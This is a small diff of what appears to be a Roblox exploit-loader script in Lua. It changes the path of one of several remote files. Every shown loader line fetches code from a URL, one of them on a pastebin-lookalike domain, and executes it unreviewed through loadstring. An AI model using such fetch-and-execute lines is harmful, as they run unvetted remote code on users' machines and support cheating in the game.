@@ -48,4 +48,4 @@ game.StarterGui:SetCore("ChatMakeSystemMessage", {
 loadstring(game:HttpGetAsync("https://pastebinp.com/raw/e8NK6hE1"))()
 setfpscap(120)
 loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/itszw/Aaa-Ama-Yok/main/spy"))()
-loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/itszw/Aaa-Ama-Yok/main/anims"))()
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/itszw/Aaa-Ama-Yok/main/Anims.lua"))()
